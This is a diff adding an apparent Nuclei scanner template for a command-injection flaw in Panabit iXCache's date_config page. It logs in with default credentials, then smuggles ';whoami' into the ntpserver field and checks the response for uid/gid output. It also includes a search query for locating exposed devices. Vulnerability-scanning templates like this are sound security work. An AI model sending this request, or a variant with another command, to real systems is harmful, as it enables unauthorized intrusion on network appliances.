@@ -1,0 +1,56 @@
+id: panabit-ixcache-rce
+
+info:
+  name: Panabit iXCache date_config - Remote Code Execution
+  author: momika233
+  severity: critical
+  description: |
+    Panabit iXCache date_config module has command splicing, resulting in the execution of arbitrary commands.
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/Panabit/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 2
+    fofa-qeury: title="iXCache"
+    veified: true
+  tags: panabit,rce,ixcache,intrusive
+
+http:
+  - raw:
+      - |
+        POST /login/userverify.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+      - |
+        POST /cgi-bin/Maintain/date_config HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ntpserver=0.0.0.0;whoami&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - ixcache
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a00463044022024072ca794b49ade9923364f3c2f68bb283731b236da8f9b34c7f51be09a15680220720bf1c56c1cda865a6f69a512166c70d0ee85f0c43e75eaf4b2fb1ac5a1d6f6:922c64590222798bb761d5b6d8e72950
